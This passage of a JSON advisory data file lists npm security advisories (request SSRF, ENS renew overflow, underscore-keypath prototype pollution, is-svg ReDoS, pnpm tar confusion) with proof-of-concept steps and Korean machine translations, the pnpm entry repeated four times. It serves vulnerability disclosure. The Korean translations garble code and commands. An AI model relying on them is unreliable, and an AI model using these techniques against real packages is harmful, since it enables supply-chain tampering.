    "identifiers": "GHSA : GHSA-p8p7-x288-28g6\nCVE : CVE-2023-28155",
    "severity": "MODERATE",
    "updatedAt": "2023-08-02T23:08:48Z",
    "publishedAt": "2023-03-16T15:30:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-28155\nhttps://github.com/request/request/issues/3442\nhttps://github.com/request/request/pull/3444\nhttps://doyensec.com/resources/Doyensec_Advisory_RequestSSRF_Q12023.pdf\nhttps://security.netapp.com/advisory/ntap-20230413-0007/\nhttps://github.com/github/advisory-database/pull/2500\nhttps://github.com/cypress-io/request/blob/master/lib/redirect.js#L116\nhttps://github.com/request/request/blob/master/lib/redirect.js#L111\nhttps://github.com/advisories/GHSA-p8p7-x288-28g6",
    "name": "@cypress/request",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.88.12",
    "descriptionKR": "Node.js용 2.88.2까지의 'request' 패키지와 2.88.12까지의 '@cypress/request' 패키지는 교차 프로토콜 리디렉션(HTTP에서 HTTPS로, 또는 HTTPS에서 HTTP로).\n\n참고: `request` 패키지는 관리자가 더 이상 지원하지 않습니다."
  },
  {
    "description": "### Description\nAccording to the documentation, controllers are allowed to register new domains and extend the expiry of existing domains, but they cannot change the ownership or reduce the expiration time of existing domains. However, a preliminary analysis suggests that an attacker-controlled controller may be able to reduce the expiration time of existing domains due to an integer overflow in the renew function.\n\nThe vulnerability resides in the following GitHub repository: https://github.com/ensdomains/ens-contracts/blob/master/contracts/ethregistrar/BaseRegistrarImplementation.sol#L171 \n\nThe vulnerable line of code is:\n```\nrequire(\n            expiries[id] + duration + GRACE_PERIOD > duration + GRACE_PERIOD\n        ); // Prevent future overflow\n```\n\nIn this code snippet, the `duration` variable is user-supplied, making it possible to provide a value that would cause an overflow on both sides of the '>' expression, ultimately rendering the condition true. Specifically, when the duration is set to `2^256 - GRACE_PERIOD`, the subsequent line `expiries[id] += duration;` also experiences an overflow, as `expiries[id]` is greater than `GRACE_PERIOD`. This results in the reduction of `expiries[id]` by `GRACE_PERIOD`. By repeatedly calling the renew function, an attacker could potentially force the expiration of an ENS record.\n\nYou can find the PoC included in the attached document. To execute the test, please use the following command:\n```\nforge test -vvv --match-contract RegistrarExploit --fork-url <alchemy_url>\n```\n\nReplace `<alchemy_url>` with your Alchemy API URL. This command will run the Foundry test file and demonstrate the potential vulnerability.\n\n### Impact\nIf successfully exploited, this vulnerability would enable attackers to force the expiration of any ENS record, ultimately allowing them to claim the affected domains for themselves.\n\nCurrently, it would require a malicious DAO to exploit it. Nevertheless, any vulnerability present in the controllers could potentially render this issue exploitable in the future.\n\nAn additional concern is the possibility of renewal discounts. Should ENS decide to implement a system that offers unlimited .eth domains for a fixed fee in the future, the vulnerability could become exploitable by any user due to the reduced attack cost.\n\n### Patches\nA mitigation is being developed.\n\n### Workarounds\nAs long as registration cost remains linear or superlinear based on registration duration, or limited to a reasonable maximum (eg, 1 million years), this vulnerability could only be exploited by a malicious DAO. The interim workaround is thus to take no action.\n",
    "identifiers": "GHSA : GHSA-rrxv-q8m4-wch3\nCVE : CVE-2023-38698",
    "severity": "MODERATE",
    "updatedAt": "2023-08-04T18:42:09Z",
    "publishedAt": "2023-08-01T19:48:31Z",
    "references": "https://github.com/ensdomains/ens-contracts/security/advisories/GHSA-rrxv-q8m4-wch3\nhttps://github.com/ensdomains/ens-contracts/commit/e6b136e979084de3761c125142620304173990ca\nhttps://github.com/ensdomains/ens-contracts/blob/master/contracts/ethregistrar/BaseRegistrarImplementation.sol#L171\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38698\nhttps://github.com/advisories/GHSA-rrxv-q8m4-wch3",
    "name": "@ensdomains/ens-contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.21",
    "identifier": "0.0.22",
    "descriptionKR": "### 설명\n설명서에 따르면 컨트롤러는 새 도메인을 등록하고 기존 도메인의 만료 기간을 연장할 수 있지만 소유권을 변경하거나 기존 도메인의 만료 시간을 줄일 수는 없습니다. 그러나 예비 분석에 따르면 공격자가 제어하는 ​​컨트롤러는 갱신 기능의 정수 오버플로로 인해 기존 도메인의 만료 시간을 줄일 수 있습니다.\n\n취약점은 다음 GitHub 리포지토리에 있습니다. https://github.com/ensdomains/ens-contracts/blob/master/contracts/ethregistrar/BaseRegistrarImplementation.sol#L171\n\n취약한 코드 라인은 다음과 같습니다.\n```\n필요하다(\n            만료[id] + 기간 + GRACE_PERIOD > 기간 + GRACE_PERIOD\n        ); // 향후 오버플로 방지\n```\n\n이 코드 스니펫에서 `duration` 변수는 사용자가 제공하므로 '>' 표현식의 양쪽에서 오버플로를 유발하여 궁극적으로 조건을 true로 렌더링하는 값을 제공할 수 있습니다. 구체적으로 기간이 `2^256 - GRACE_PERIOD`로 설정된 경우 `expiries[id] += duration;`도 `expiries[id]`가 `GRACE_PERIOD`보다 크기 때문에 오버플로가 발생합니다. 그 결과 `expiries[id]`가 `GRACE_PERIOD`만큼 감소합니다. 갱신 기능을 반복적으로 호출함으로써 공격자는 잠재적으로 ENS 레코드의 만료를 강제할 수 있습니다.\n\n첨부된 문서에 포함된 PoC를 확인하실 수 있습니다. 테스트를 실행하려면 다음 명령을 사용하십시오.\n```\n위조 테스트 -vvv --match-contract RegistrarExploit --fork-url <alchemy_url>\n```\n\n`<alchemy_url>`을 Alchemy API URL로 바꿉니다. 이 명령은 Foundry 테스트 파일을 실행하고 잠재적인 취약점을 보여줍니다.\n\n### 영향\n성공적으로 악용될 경우 공격자는 ENS 레코드를 강제로 만료시켜 궁극적으로 영향을 받는 도메인을 스스로 주장할 수 있습니다.\n\n현재 이를 악용하려면 악의적인 DAO가 필요합니다. 그럼에도 불구하고 컨트롤러에 존재하는 모든 취약성은 향후 이 문제를 잠재적으로 악용할 수 있습니다.\n\n추가적인 우려는 갱신 할인 가능성입니다. ENS가 미래에 고정 요금으로 무제한 .eth 도메인을 제공하는 시스템을 구현하기로 결정하면 감소된 공격 비용으로 인해 모든 사용자가 취약점을 악용할 수 있습니다.\n\n### 패치\n완화 조치가 개발 중입니다.\n\n### 해결 방법\n등록 비용이 등록 기간에 따라 선형 또는 초선형으로 유지되거나 합리적인 최대값(예: 100만 년)으로 제한되는 한 이 취약점은 악의적인 DAO에 의해서만 악용될 수 있습니다. 따라서 임시 해결 방법은 아무 조치도 취하지 않는 것입니다."
  },
  {
    "description": "Versions of the package underscore-keypath from 0.0.11 are vulnerable to Prototype Pollution via the name argument of the `setProperty()` function. Exploiting this vulnerability is possible due to improper input sanitization which allows the usage of arguments like `__proto__`.",
    "identifiers": "GHSA : GHSA-gpvc-mx6g-cchv\nCVE : CVE-2023-26139",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T19:47:11Z",
    "publishedAt": "2023-08-01T06:30:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26139\nhttps://gist.github.com/lelecolacola123/cc0d1e73780127aea9482c05f2ff3252\nhttps://security.snyk.io/vuln/SNYK-JS-UNDERSCOREKEYPATH-5416714\nhttps://github.com/advisories/GHSA-gpvc-mx6g-cchv",
    "name": "underscore-keypath",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.0.11, <= 0.9.3",
    "descriptionKR": "0.0.11의 underscore-keypath 패키지 버전은 `setProperty()` 함수의 이름 인수를 통해 Prototype Pollution에 취약합니다. 이 취약점을 악용하는 것은 `__proto__`와 같은 인수의 사용을 허용하는 부적절한 입력 삭제로 인해 가능합니다."
  },
  {
    "description": "The is-svg package 2.1.0 through 4.2.1 for Node.js uses a regular expression that is vulnerable to Regular Expression Denial of Service (ReDoS). If an attacker provides a malicious string, is-svg will get stuck processing the input for a very long time.",
    "identifiers": "GHSA : GHSA-7r28-3m3f-r2pr\nCVE : CVE-2021-28092",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T19:25:13Z",
    "publishedAt": "2021-03-19T21:25:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-28092\nhttps://github.com/sindresorhus/is-svg/commit/01f8a087fab8a69c3ac9085fbb16035907ab6a5b\nhttps://github.com/sindresorhus/is-svg/releases\nhttps://github.com/sindresorhus/is-svg/releases/tag/v4.2.2\nhttps://www.npmjs.com/package/is-svg\nhttps://security.netapp.com/advisory/ntap-20210513-0008/\nhttps://github.com/advisories/GHSA-7r28-3m3f-r2pr",
    "name": "is-svg",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.1.0, < 4.2.2",
    "identifier": "4.2.2",
    "descriptionKR": "Node.js용 is-svg 패키지 2.1.0~4.2.1은 정규식 서비스 거부(ReDoS)에 취약한 정규식을 사용합니다. 공격자가 악의적인 문자열을 제공하면 is-svg는 오랫동안 입력 처리를 중단합니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/win-x64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 8.6.8",
    "identifier": "8.6.8",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/macos-x64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 8.6.8",
    "identifier": "8.6.8",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/macos-arm64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 8.6.8",
    "identifier": "8.6.8",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/linuxstatic-arm64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 8.6.8",
    "identifier": "8.6.8",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
